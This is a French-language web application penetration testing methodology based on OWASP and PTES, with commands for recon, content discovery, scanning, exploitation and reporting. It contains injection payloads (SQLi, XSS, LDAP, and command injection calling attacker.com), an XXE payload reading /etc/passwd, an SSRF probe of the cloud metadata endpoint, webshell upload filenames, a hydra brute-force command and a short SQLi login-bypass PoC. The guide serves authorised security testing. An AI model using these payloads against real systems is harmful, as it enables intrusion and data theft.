# Methodologie de Test d'Applications Web

Guide professionnel pour tests d'intrusion d'applications web bases sur OWASP Testing Guide et PTES.

## Table des Matieres

1. [Reconnaissance](#1-reconnaissance)
2. [Cartographie](#2-cartographie)
3. [Analyse de Vulnerabilites](#3-analyse-de-vulnerabilites)
4. [Exploitation](#4-exploitation)
5. [Post-Exploitation](#5-post-exploitation)
6. [Reporting](#6-reporting)

---

## 1. Reconnaissance

### 1.1 Reconnaissance Passive (OSINT)

**Objectif:** Collecter des informations sans interaction directe

**Actions:**
```bash
# Enumeration de sous-domaines
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com -o amass-results.txt

# Recherche de fuites de donnees
# - Have I Been Pwned
# - Dehashed
# - Intelligence X

# Google Dork
site:target.com
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login

# Wayback Machine
# - web.archive.org
# - Verifier anciennes versions du site
```

**Logging:**
```bash
python utilities/engagement-logger.py --log "Reconnaissance passive" \
  --category reconnaissance --target "target.com" \
  --details "Subfinder: 45 subdomains found"
```

### 1.2 Reconnaissance Active

**Objectif:** Interaction directe avec la cible

**Actions:**
```bash
# Verification des hotes actifs
httpx -l subdomains.txt -o live-hosts.txt

# Detection de technologies
whatweb -i live-hosts.txt
wappalyzer target.com

# Enumeration DNS
dnsenum target.com
dnsrecon -d target.com -t std

# Certificats SSL
# - crt.sh
# - censys.io
```

**Logging:**
```bash
python utilities/engagement-logger.py --log "Reconnaissance active" \
  --category reconnaissance --target "target.com" \
  --details "Found 23 live hosts, technologies identified"
```

---

## 2. Cartographie

### 2.1 Crawling et Spidering

**Objectif:** Mapper la structure de l'application

**Actions:**
```bash
# Burp Suite
# - Spider automatique
# - Analyser sitemap.xml et robots.txt

# gospider
gospider -s https://target.com -o output

# hakrawler
echo https://target.com | hakrawler -depth 3

# katana
katana -u https://target.com -d 5 -o crawled.txt
```

**Points a Verifier:**
- robots.txt
- sitemap.xml
- .git / .svn expos√©s
- Fichiers de configuration
- Pages d'administration
- API endpoints

### 2.2 Discovery de Contenu

**Objectif:** Trouver fichiers et repertoires caches

**Actions:**
```bash
# Fuzzing de repertoires
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ

# gobuster
gobuster dir -u https://target.com -w wordlist.txt -o gobuster-results.txt

# dirsearch
dirsearch -u https://target.com -e php,html,js -o dirsearch.txt

# feroxbuster
feroxbuster -u https://target.com -w wordlist.txt -x php,txt,html
```

**Wordlists Recommandees:**
- SecLists (raft, directory-list)
- dirbuster wordlists
- Custom wordlists basees sur technologies detectees

**Logging:**
```bash
python utilities/engagement-logger.py --log "Content discovery" \
  --category enumeration --target "target.com" \
  --details "ffuf found 127 endpoints"
```

---

## 3. Analyse de Vulnerabilites

### 3.1 Scan Automatise

**Actions:**
```bash
# Nuclei (scan de vulnerabilites)
nuclei -l live-hosts.txt -t cves/ -t vulnerabilities/ -o nuclei-findings.txt

# Nikto
nikto -h https://target.com -o nikto-results.txt

# OWASP ZAP (mode passif puis actif)
zap-cli --zap-url http://localhost:8080 quick-scan https://target.com

# SQLMap (si suspicion SQLi)
sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2
```

**Logging:**
```bash
python utilities/engagement-logger.py --log "Automated scanning" \
  --category scanning --target "target.com" \
  --details "Nuclei: 12 vulnerabilities found"
```

### 3.2 Tests Manuels

#### 3.2.1 Injection

**SQL Injection:**
```
Test payloads:
- ' OR '1'='1
- " OR "1"="1
- ' OR '1'='1' --
- admin' --
- 1' UNION SELECT NULL--
```

**XSS (Cross-Site Scripting):**
```html
<!-- Reflected XSS -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Stored XSS -->
<!-- Tester dans tous les champs utilisateur -->

<!-- DOM-based XSS -->
<!-- Analyser le code JavaScript -->
```

**Command Injection:**
```bash
; ls
| whoami
& ping -c 10 attacker.com
`id`
$(whoami)
```

**LDAP Injection:**
```
*
*)(&
*))%00
admin*)((|userPassword=*)
```

#### 3.2.2 Authentification

**Tests:**
- Brute force (avec rate limiting)
- Enumeration d'utilisateurs
- Password reset flaws
- Session fixation
- Remember me functionality
- Logout functionality
- Multi-factor authentication bypass

**Outils:**
```bash
# Hydra
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Burp Intruder (rate-limited)
# FFuF pour enumeration
```

**Logging:**
```bash
python utilities/engagement-logger.py --log "Authentication testing" \
  --category exploitation --target "target.com/login" \
  --details "User enumeration possible via timing attack"
```

#### 3.2.3 Gestion de Session

**Tests:**
- Cookie security (HttpOnly, Secure, SameSite)
- Session token strength
- Session fixation
- Session timeout
- Concurrent sessions
- CSRF protection

**Burp Suite:**
- Sequencer pour analyser tokens
- Repeater pour session testing

#### 3.2.4 Controle d'Acces

**Tests:**
- IDOR (Insecure Direct Object Reference)
- Privilege escalation (horizontal/vertical)
- Forced browsing
- Missing function level access control
- CORS misconfiguration

**Exemples:**
```
# IDOR
GET /api/user/123/profile
GET /api/user/124/profile  # Tester autres IDs

# Privilege escalation
# User normal -> Admin
# Modifier role dans requete
```

#### 3.2.5 Validation des Entrees

**Tests:**
- File upload vulnerabilities
- XXE (XML External Entity)
- SSRF (Server-Side Request Forgery)
- Path traversal
- Input validation

**File Upload:**
```bash
# Tester extensions
shell.php
shell.php.jpg
shell.php%00.jpg
shell.PhP

# Magic bytes manipulation
# Double extensions
# MIME type bypass
```

**XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**SSRF:**
```
# Internal network scan
http://169.254.169.254/latest/meta-data/
http://localhost/admin
http://192.168.1.1/
```

#### 3.2.6 Logique Metier

**Tests:**
- Race conditions
- Price manipulation
- Quantity manipulation
- Workflow bypass
- Business logic flaws

**Exemples:**
- Appliquer coupon multiple fois
- Prix negatif
- Bypass etapes de workflow

---

## 4. Exploitation

### 4.1 Exploitation des Vulnerabilites Identifiees

**Workflow:**
1. Valider la vulnerabilite manuellement
2. Developper/adapter un exploit
3. Tester sur environnement de dev si possible
4. Executer l'exploit
5. Documenter les resultats
6. Creer PoC pour le rapport

**Logging:**
```bash
python utilities/engagement-logger.py --log "SQL injection exploited" \
  --category exploitation --target "app.target.com/page?id=1" \
  --severity high --details "Database extracted via union-based SQLi"
```

### 4.2 Developpement de PoC

**Bonnes Pratiques:**
- PoC minimal et fonctionnel
- Code commente
- Instructions claires
- Pas de donnees sensibles reelles
- Versionne et sauvegarde

**Exemple PoC SQLi:**
```python
#!/usr/bin/env python3
"""
PoC: SQL Injection in target.com login form
Severity: Critical
CVSS: 9.1
"""

import requests

url = "https://target.com/login"
payload = "admin' OR '1'='1' --"

data = {
    'username': payload,
    'password': 'anything'
}

response = requests.post(url, data=data)

if "Welcome admin" in response.text:
    print("[+] SQL Injection successful!")
    print("[+] Logged in as admin")
else:
    print("[-] Exploit failed")
```

---

## 5. Post-Exploitation

### 5.1 Maintien d'Acces (Avec Autorisation)

**Uniquement si authorise par le client:**
- Backdoor minimaliste
- Shell persistant
- Documentation precise pour cleanup

**Logging:**
```bash
python utilities/engagement-logger.py --log "Persistence established" \
  --category post-exploitation --target "app.target.com" \
  --details "Webshell deployed at /uploads/test.php for authorized testing"
```

### 5.2 Exfiltration de Donnees (Simulee)

**Tests:**
- Data leakage channels
- Download restrictions
- DLP bypass

**Important:** Ne jamais exfiltrer de vraies donnees sensibles

---

## 6. Reporting

### 6.1 Documentation des Findings

**Pour chaque vulnerabilite:**

```bash
python reporting/report-generator.py --add-finding \
  --title "SQL Injection in login form" \
  --severity critical \
  --cvss "9.1" \
  --description "The application login form is vulnerable to SQL injection via the username parameter" \
  --impact "Full database compromise, authentication bypass, data exfiltration" \
  --affected "https://app.target.com/login" \
  --poc "See exploit-sqli.py" \
  --remediation "Implement prepared statements for all SQL queries" \
  --reference "https://owasp.org/www-community/attacks/SQL_Injection"
```

### 6.2 Generation du Rapport Final

```bash
# Generer rapport Markdown
python reporting/report-generator.py --generate --format markdown

# Generer rapport HTML
python reporting/report-generator.py --generate --format html

# Les deux formats
python reporting/report-generator.py --generate --format both
```

---

## Checklist Complete OWASP Top 10 2021

### A01:2021 - Broken Access Control
- [ ] IDOR teste
- [ ] Privilege escalation teste
- [ ] CORS misconfiguration verifie
- [ ] Forced browsing teste

### A02:2021 - Cryptographic Failures
- [ ] HTTPS force
- [ ] Certificat SSL valide
- [ ] Algorithmes cryptographiques forts
- [ ] Donnees sensibles non exposees

### A03:2021 - Injection
- [ ] SQL Injection teste
- [ ] XSS (Reflected, Stored, DOM) teste
- [ ] Command Injection teste
- [ ] LDAP/XML Injection teste

### A04:2021 - Insecure Design
- [ ] Logique metier testee
- [ ] Threat modeling effectue
- [ ] Rate limiting verifie

### A05:2021 - Security Misconfiguration
- [ ] Erreurs detaillees non exposees
- [ ] Comptes par defaut changes
- [ ] Services inutiles desactives
- [ ] Headers de securite presents

### A06:2021 - Vulnerable Components
- [ ] Scan de dependances effectue
- [ ] Versions a jour
- [ ] CVEs connues verifiees

### A07:2021 - Authentication Failures
- [ ] Brute force protection
- [ ] Session management teste
- [ ] MFA implemente
- [ ] Password policy adequate

### A08:2021 - Software and Data Integrity Failures
- [ ] Deserialization securisee
- [ ] CI/CD pipeline securise
- [ ] Integrite des updates verifiee

### A09:2021 - Logging Failures
- [ ] Logs adequats
- [ ] Monitoring en place
- [ ] Alertes configurees

### A10:2021 - SSRF
- [ ] SSRF teste
- [ ] Validation d'URLs
- [ ] Firewall applicatif

---

## Outils Recommandes par Phase

### Reconnaissance
- Subfinder, Amass - Enumeration sous-domaines
- theHarvester - Email/domain gathering
- Shodan, Censys - Search engines

### Cartographie
- Burp Suite Pro - Proxy/spider
- gospider, hakrawler - Crawling
- ffuf, gobuster - Content discovery

### Analyse
- Nuclei - Vulnerability scanning
- Burp Scanner - Automated scanning
- SQLMap - SQL injection
- XSStrike - XSS detection

### Exploitation
- Metasploit - Exploitation framework
- Burp Suite Pro - Manual testing
- Custom scripts - PoC development

### Reporting
- Dradis, Serpico - Report generation
- Scripts custom - Automation

---

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)

---

**Note:** Toujours obtenir une autorisation ecrite avant de tester une application web.
